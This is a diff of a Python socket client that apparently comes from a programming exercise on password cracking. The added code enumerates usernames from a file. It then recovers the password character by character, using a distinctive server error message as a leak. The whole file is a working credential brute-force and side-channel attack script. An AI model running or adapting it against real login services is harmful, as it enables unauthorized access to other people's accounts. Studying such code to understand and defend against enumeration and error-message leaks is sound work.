@@ -1,18 +1,15 @@
 import argparse
-from itertools import product
 import socket
+from json import loads, dumps
+from string import ascii_letters, digits
+from time import perf_counter
 
 
-def new_password():
-    with open("passwords.txt", "r") as temp_password:
-        for line in temp_password:
+def new_login():
+    with open("C:\logins.txt", "r") as temp_login:
+        for line in temp_login:
             word = line.strip()
-            if line.isdigit():
-                yield line
-            else:
-                word_combinations = product(*([letter.lower(), letter.upper()] for letter in word))
-                for word in word_combinations:
-                    yield ''.join(word)
+            yield word
 
 
 parser = argparse.ArgumentParser()
@@ -24,13 +21,39 @@ args = parser.parse_args()
 ip_address = args.host
 port = int(args.port)
 address = (ip_address, port)
-password = new_password()
-response = ""
+login = new_login()
+response = {"result": ""}
+
+correct_login = None
+password = ""
 
 with socket.socket() as client_socket:
+    x = 0
+    char_list = list(ascii_letters) + list(digits)
+
     client_socket.connect(address)
-    while response != "Connection success!":
-        data = next(password).encode()
+
+    while response["result"] != "Wrong password!":
+        correct_login = str(next(login))
+        date_dict = {"login": correct_login, "password": " "}
+
+        data = dumps(date_dict).encode()
         client_socket.send(data)
-        response = client_socket.recv(1024).decode()
-    print(data.decode())
+        response = loads(client_socket.recv(1024).decode())
+
+    while True:
+        date_dict = {"login": correct_login, "password": password + str(char_list[x])}
+
+        if response["result"] == "Wrong password!":
+            data = dumps(date_dict).encode()
+            client_socket.send(data)
+            response = loads(client_socket.recv(1024).decode())
+        if response["result"] == "Exception happened during login":
+            password += str(char_list[x])
+            x = 0
+            response = {"result": "Wrong password!"}
+        elif response["result"] == "Connection success!":
+            print(dumps(date_dict))
+            break
+        else:
+            x += 1
